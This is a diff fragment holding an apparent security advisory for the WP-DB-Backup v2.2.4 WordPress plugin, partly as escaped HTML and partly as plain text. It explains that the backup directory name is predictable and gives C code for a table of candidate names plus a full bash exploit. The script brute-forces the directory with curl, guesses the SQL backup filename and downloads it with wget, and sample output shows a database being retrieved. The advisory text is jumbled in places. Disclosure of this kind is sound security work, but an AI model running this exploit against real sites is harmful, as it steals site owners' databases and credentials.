style="color: #339933;"&gt;;&lt;/span&gt; then&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Z&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;K&lt;span style="color: #339933;"&gt;=&lt;/span&gt;`wc &lt;span style="color: #339933;"&gt;-&lt;/span&gt;l rainbow&lt;span style="color: #339933;"&gt;|&lt;/span&gt;awk &lt;span style="color: #0000ff;"&gt;'{print $1}'&lt;/span&gt;`&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Searching....&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        &lt;span style="color: #b1b100;"&gt;for&lt;/span&gt; x in `cat rainbow`&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #b1b100;"&gt;do&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                CPATH&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://&lt;span">http://&lt;span</a> style="color: #006699; font-weight: bold;"&gt;$1&lt;/span&gt;/wp-content/backup-&lt;span style="color: #006699; font-weight: bold;"&gt;$x&lt;/span&gt;/&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 RESULT&lt;span style="color: #339933;"&gt;=&lt;/span&gt;`curl &lt;span style="color: #339933;"&gt;-&lt;/span&gt;s &lt;span style="color: #339933;"&gt;--&lt;/span&gt;head &lt;span style="color: #000088;"&gt;$CPATH&lt;/span&gt;&lt;span style="color: #339933;"&gt;|&lt;/span&gt;grep &lt;span style="color: #cc66cc;"&gt;200&lt;/span&gt;`&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                &lt;span style="color: #b1b100;"&gt;if&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;n &lt;span style="color: #0000ff;"&gt;&amp;quot;&lt;span style="color: #006699; font-weight: bold;"&gt;$RESULT&lt;/span&gt;&amp;quot;&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; then&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Location &lt;span style="color: #006699; font-weight: bold;"&gt;$CPATH&lt;/span&gt; Found&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Received &lt;span style="color: #006699; font-weight: bold;"&gt;$RESULT&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #000088;"&gt;$x&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; found&lt;span style="color: #339933;"&gt;.&lt;/span&gt;txt&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;break&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #666666; font-style: italic;"&gt;#break here&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        fi&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;n &lt;span style="color: #0000ff;"&gt;&amp;quot;Percent Done: &amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 Y&lt;span style="color: #339933;"&gt;=&lt;/span&gt;`&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;scale=6;(&lt;span style="color: #006699; font-weight: bold;"&gt;$Z&lt;/span&gt;/&lt;span style="color: #006699; font-weight: bold;"&gt;$K&lt;/span&gt;)<em>100&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;|&lt;/span&gt;bc`&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;n &lt;span style="color: #000088;"&gt;$Y&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;%&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 Z&lt;span style="color: #339933;"&gt;=&lt;/span&gt;$&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt; &lt;span style="color: #000088;"&gt;$Z&lt;/span&gt; &lt;span style="color: #339933;"&gt;+&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;done&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;else&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;x&lt;span style="color: #339933;"&gt;=&lt;/span&gt;`cat found&lt;span style="color: #339933;"&gt;.&lt;/span&gt;txt`&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;fi&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #666666; font-style: italic;"&gt;# Now that we have the directory lets try to locate the database backup file.&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;K&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;999&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&lt;span style="color: #b1b100;"&gt;for&lt;/span&gt; y in `seq &lt;span style="color: #339933;"&gt;-&lt;/span&gt;w &lt;span style="color: #cc66cc;"&gt;0&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;999&lt;/span&gt;`&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #b1b100;"&gt;do&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                CPATH&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://&lt;span">http://&lt;span</a> style="color: #006699; font-weight: bold;"&gt;$1&lt;/span&gt;/wp-content/backup-&lt;span style="color: #006699; font-weight: bold;"&gt;$x&lt;/span&gt;/wordpress_wp_&lt;span style="color: #006699; font-weight: bold;"&gt;$2_&lt;/span&gt;&lt;span style="color: #006699; font-weight: bold;"&gt;$y&lt;/span&gt;.sql&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #666666; font-style: italic;"&gt;#change WP Database Name and Table Prefix here&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 RESULT&lt;span style="color: #339933;"&gt;=&lt;/span&gt;`curl &lt;span style="color: #339933;"&gt;-&lt;/span&gt;s &lt;span style="color: #339933;"&gt;--&lt;/span&gt;head &lt;span style="color: #000088;"&gt;$CPATH&lt;/span&gt;&lt;span style="color: #339933;"&gt;|&lt;/span&gt;grep &lt;span style="color: #cc66cc;"&gt;200&lt;/span&gt;`&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                &lt;span style="color: #b1b100;"&gt;if&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#91;&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;n &lt;span style="color: #0000ff;"&gt;&amp;quot;&lt;span style="color: #006699; font-weight: bold;"&gt;$RESULT&lt;/span&gt;&amp;quot;&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#93;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; then&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Database backup &lt;span style="color: #006699; font-weight: bold;"&gt;$CPATH&lt;/span&gt; Found&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;[+] Received &lt;span style="color: #006699; font-weight: bold;"&gt;$RESULT&lt;/span&gt;&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 wget &lt;span style="color: #000088;"&gt;$CPATH&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;a href="<a href="http://www.php.net/exit">http://www.php.net/exit</a>"&gt;&lt;span style="color: #990000;"&gt;exit&lt;/span&gt;&lt;/a&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #666666; font-style: italic;"&gt;#break here&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;        fi&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;n &lt;span style="color: #0000ff;"&gt;&amp;quot;Percent Done: &amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 Y&lt;span style="color: #339933;"&gt;=&lt;/span&gt;`&lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;scale=2;(&lt;span style="color: #006699; font-weight: bold;"&gt;$Z&lt;/span&gt;/&lt;span style="color: #006699; font-weight: bold;"&gt;$K&lt;/span&gt;)</em>100&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;|&lt;/span&gt;bc`&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;n &lt;span style="color: #000088;"&gt;$Y&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #0000ff;"&gt;&amp;quot;%&amp;quot;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;                 Z&lt;span style="color: #339933;"&gt;=&lt;/span&gt;$&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#40;&lt;/span&gt; &lt;span style="color: #000088;"&gt;$Z&lt;/span&gt; &lt;span style="color: #339933;"&gt;+&lt;/span&gt; &lt;span style="color: #cc66cc;"&gt;1&lt;/span&gt; &lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #009900;"&gt;&amp;#41;&lt;/span&gt;&lt;span style="color: #339933;"&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;done&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/">http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                    Advisory #: 81
+Title: Wordpress WP-DB-Backup v2.2.4 Plugin Remote Database Backup Download
+Vulnerability
+Author:Larry W. Cashdollar, @_larry0
+Date: 2014-11-02
+Download Site: http://austinmatzko.com/wordpress-plugins/wp-db-backup/
+Vendor:pressedcode.com
+Vendor Notified: 2014-11-04
+Vendor Contact:
+Description: P-DB-Backup allows you easily to backup your core WordPress database
+tables. You may also backup other tables in the same database.
+Vulnerability:
+WP-DB-Backup creates a backup storage path under the wp-contents directory of the
+wordpress installation if the option to store backups locally is selected (not
+default). The path is: /wordpress/wp-content/backup-[5_characters_of_md5sum]/ Where
+the backup directory name is derived from lines in wp-db-backup.php: 36 $rand = substr
+( md5( md5( DB_PASSWORD ) ), -5 ); . . 42 if ( ! defined('WP_BACKUP_DIR') ) { 43
+define('WP_BACKUP_DIR', $wpdbb_content_dir . '/backup-' . $rand . '/'); 44 } 45 46 if
+( ! defined('WP_BACKUP_URL') ) { 47 define('WP_BACKUP_URL', $wpdbb_content_url . '/
+backup-' . $rand . '/'); 48 } It's not random enough as the md5 characters can only be
+0-9 and a-f (hexadecimal), which turns out to be 16^5 possible combinations or
+1048576. And it will always be five characters no less. A small C program can generate
+a rainbow table (uncompressed about 6MB) in a few seconds. See exploit section for
+full PoC. /*Create rainbow table for guessing wp-backup-db v2.2.4 backup path Larry W.
+Cashdollar*/ #include <stdio.h> #include <stdlib.h> int main (void) { char string[16]
+= "0123456789abcdef"; int x, y, z, a, b; for (x = 0; x < 16; x++) { for (y = 0; y <
+16; y++) { for (z = 0; z < 16; z++) PoC output I’ve trimmed this down for brevity.
+root@vapidlabs:~# ./exp2.sh www.vapidlabs.com 20141031 [+] Searching.... Percent Done:
+0% Percent Done: 1.960700% Percent Done: 3.921500% Percent Done: 5.882300% Percent
+Done: 7.843100% Percent Done: 9.803900% Percent Done: 11.764700% Percent Done:
+13.725400% Percent Done: 15.686200% Percent Done: 17.647000% Percent Done: 19.607800%
+Percent Done: 21.568600% Percent Done: 23.529400% Percent Done: 25.490100% Percent
+Done: 27.450900% Percent Done: 29.411700% Percent Done: 31.372500% Percent Done:
+33.333300% Percent Done: 35.294100% Percent Done: 37.254900% Percent Done: 39.215600%
+Percent Done: 41.176400% Percent Done: 43.137200% Percent Done: 45.098000% Percent
+Done: 47.058800% Percent Done: 49.019600% Percent Done: 50.980300% Percent Done:
+52.941100% Percent Done: 54.901900% Percent Done: 56.862700% Percent Done: 58.823500%
+Percent Done: 60.784300% Percent Done: 62.745000% Percent Done: 64.705800% Percent
+Done: 66.666600% Percent Done: 68.627400% Percent Done: 70.588200% Percent Done:
+72.549000% Percent Done: 74.509800% Percent Done: 76.470500% Percent Done: 78.431300%
+Percent Done: 80.392100% Percent Done: 82.352900% Percent Done: 84.313700% Percent
+Done: 86.274500% Percent Done: 88.235200% Percent Done: 90.196000% Percent Done:
+92.156800% Percent Done: 94.117600% Percent Done: 96.078400% [+] Location http://
+www.vapidlabs.com/wp-content/backup-baff5/ Found [+] Received HTTP/1.1 200 OK Percent
+Done: 5.00% Percent Done: 5.00% Percent Done: 5.00% Percent Done: 5.00% Percent Done:
+5.00% Percent Done: 5.00% Percent Done: 5.00% Percent Done: 5.00% Percent Done: 5.00%
+Percent Done: 5.00% Percent Done: 6.00% Percent Done: 6.00% Percent Done: 6.00%
+Percent Done: 6.00% Percent Done: 6.00% Percent Done: 6.00% Percent Done: 6.00%
+Percent Done: 6.00% Percent Done: 6.00% Percent Done: 6.00% Percent Done: 7.00%
+Percent Done: 7.00% Percent Done: 7.00% Percent Done: 7.00% Percent Done: 7.00%
+Percent Done: 7.00% Percent Done: 7.00% Percent Done: 7.00% Percent Done: 7.00%
+Percent Done: 7.00% Percent Done: 8.00% Percent Done: 8.00% Percent Done: 8.00%
+Percent Done: 8.00% Percent Done: 8.00% Percent Done: 8.00% [+] Database backup http:/
+/www.vapidlabs.com/wp-content/backup-baff5/wordpress_wp_20141031_036.sql Found [+]
+Received HTTP/1.1 200 OK --2014-11-17 09:44:35-- http://www.vapidlabs.com/wp-content/
+backup-baff5/wordpress_wp_20141031_036.sql Resolving www.vapidlabs.com
+(www.vapidlabs.com)... 192.168.0.26 Connecting to www.vapidlabs.com
+(www.vapidlabs.com)|192.168.0.26|:80... connected. HTTP request sent, awaiting
+response... 200 OK Length: 438401 (428K) [application/x-sql] Saving to:
+`wordpress_wp_20141031_036.sql' 100%
+[===================================================================================>]
+438,401 --.-K/s in 0.001s 2014-11-17 09:44:35 (325 MB/s) -
+`wordpress_wp_20141031_036.sql' saved [438401/438401] Also the backup files are left
+open to any local user to read. $ ls -l wordpress_wp_20141031_036.sql -rw-r--r-- 1
+www-data www-data 438401 Oct 31 19:52 wordpress_wp_20141031_036.sql Recommended Fix:
+Create .htaccess directory under root backup directory. { for (a = 0; a < 16; a++)
+{ for (b = 0; b < 16; b++) { printf ("%c%c%c%c%c\n", string[x], string[y], string[z],
+string[a], string[b]); } } } } } return(0); } # gcc rainbow.c -o rain # time ./rain >
+rainbow real 0m0.193s user 0m0.188s sys 0m0.004s # ls -l rainbow -rw-r--r-- 1 root
+root 6291456 Oct 31 21:21 rainbow # wc -l rainbow 1048576 rainbow So we've got all of
+our possible directory locations, we just need a way to check when we've found the
+correct one. An attempt is made to block file listing by placing a 0 sized index.php
+file in the backup directory. Because of the index.php file we will know if we've
+gotten the correct directory name because we will receive a 200 response from the web
+server vs 404 file not found. So a full PoC would be create our rainbow table with
+target URL, run through all of the combinations until we get a 200 response. Then
+start guessing the SQL filename. The backup files can be guessed as they follow a
+common format: DBNAME_TABLE_PREFIX_YYYYMMDAY_SWATCH_TIME.sql. For example:
+wordpress_wp_20141031_036.sql wordpress typically defaults the Prefix name to wp_. The
+database name will be the hardest thing to guess, use some derivative of wordpress,
+wp, etc.. File names are generated by lines in wp-db-backup.php: 99 $datum = date
+("Ymd_B"); 100 $this->backup_filename = DB_NAME . "_$table_prefix$datum.sql"; Where B
+is Swatch Internet time 000-999. So PoC: Find out backup path name via brute force.
+Attempt to guess database backup file name, try DBNAME of wordpress, wpdb, wordpdb etc
+scan entire day from current swatch time back down to 000. Distribute backup path
+guessing over multiple hosts with different key spaces.
+CVE-
+JSON:Export
+Exploit Code:
+   1. #!/bin/bash
+   2. #Larry W. Cashdollar, @_larry0
+   3. #Will brute force and search a Wordpress target site with WP-DB-Backup v2.2.4
+      plugin installed for any backups done on
+   4. #20141031 assumes the wordpress database is wordpress and the table prefix is
+      wp_
+   5. #http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/
+   6. #http://thehackerblog.com/auditing-wp-db-backup-wordpress-plugin-why-using-the-
+      database-password-for-entropy-is-a-bad-idea/
+   7. #run ./exp targetsite
+   8. DATE="20141031"; #Date to search
+   9. if [ ! -e rainbow ]; then
+  10. cat << -EOF- > rbow.c
+  11. /*Create rainbow table for guessing wp-backup-db v2.2.4 backup path
+  12. Larry W. Cashdollar*/
+  13. #include <stdio.h>
+  14. int
+  15. main (void)
+  16. {
+  17.   char string[16] = "0123456789abcdef";
+  18.   int x, y, z, a, b;
+  19.   for (x = 0; x < 16; x++)
+  20.       for (y = 0; y < 16; y++)
+  21.           for (z = 0; z < 16; z++)
+  22.               for (a = 0; a < 16; a++)
+  23.                   for (b = 0; b < 16; b++)
+  24.                       printf ("%c%c%c%c%c\n", string[x], string[y], string[z],
+  25.                               string[a], string[b]);
+  26. return(0);
+  27. }
+  28. -EOF-
+  29. echo "[+] Compiling rbow.c"
+  30. gcc rbow.c -o rbow
+  31. echo "[+] Creating rainbow table..."
+  32. ./rbow > rainbow
+  33. fi
+  34. if [ ! -e found.txt ]; then
+  35. Z=0
+  36. K=`wc -l rainbow|awk '{print $1}'`;
+  37. echo "[+] Searching....";
+  38.         for x in `cat rainbow`; do
+  39.                 CPATH="http://$1/wp-content/backup-$x/";
+  40.                  RESULT=`curl -s --head $CPATH|grep 200`;
+  41.                 if [ -n "$RESULT" ]; then
+  42.                  echo "[+] Location $CPATH Found";
+  43.                  echo "[+] Received $RESULT";
+  44.                  echo $x > found.txt;
+  45.                  break; #break here
+  46.         fi;
+  47.                  echo -n "Percent Done: ";
+  48.                  Y=`echo "scale=6;($Z/$K)*100"|bc`;
+  49.                  echo -n $Y
+  50.                  echo "%";
+  51.                  Z=$(( $Z + 1 ));
+  52. done
+  53. else
+  54. x=`cat found.txt`;
+  55. fi
+  56. # Now that we have the directory lets try to locate the database backup file.
+  57. K=999;
+  58. for y in `seq -w 0 999`; do
+  59.                 CPATH="http://$1/wp-content/backup-$x/wordpress_wp_$2_$y.sql";
+      #change WP Database Name and Table Prefix here
+  60.                  RESULT=`curl -s --head $CPATH|grep 200`;
+  61.                 if [ -n "$RESULT" ]; then
+  62.                  echo "[+] Database backup $CPATH Found";
+  63.                  echo "[+] Received $RESULT";
+  64.                  wget $CPATH
+  65.                  exit; #break here
+  66.         fi;
+  67.                  echo -n "Percent Done: ";
+  68.                  Y=`echo "scale=2;($Z/$K)*100"|bc`;
+  69.                  echo -n $Y
+  70.                  echo "%";
+  71.                  Z=$(( $Z + 1 ));
+  72. done
+  73.  
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/
